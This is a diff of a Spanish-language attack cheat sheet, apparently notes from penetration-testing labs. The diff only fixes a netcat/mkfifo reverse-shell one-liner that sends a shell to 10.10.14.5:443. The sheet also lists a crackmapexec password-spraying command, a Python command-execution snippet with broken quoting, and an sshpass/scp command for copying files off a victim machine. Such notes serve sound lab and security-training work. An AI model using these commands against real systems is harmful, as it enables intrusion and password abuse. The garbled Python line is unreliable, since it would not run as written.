@@ -3,7 +3,7 @@
 **Expresion regular para eliminar espacios en blanco de un texto:** `/^\s*$/d`
 **Expresion regular para filtrar por rangos con awk**: `awk "/' -/,/:cannot open/" `
 ## Linux
-**Reverse Shell; MKFIFO**: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 10.10.14.5 443 >/tmp/f;*`
+**Reverse Shell; MKFIFO**: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 10.10.14.5 443 >/tmp/f;`
 **Reutilizar contraseña para todos los usuarios en el sistema con CME(crackmapexec)**: `-u users -p '<password>' --continue-on-success`
 **Ejecutar comandos desde consola interactiva de Python3 y ver el output**:`print(os.popen(""$command")).read())`
 **Mandar binarios de maquina victima a maquina atacando con SSH**: `sshpass -p '$passwd' scp $user@$ip:/path/to/binary .`
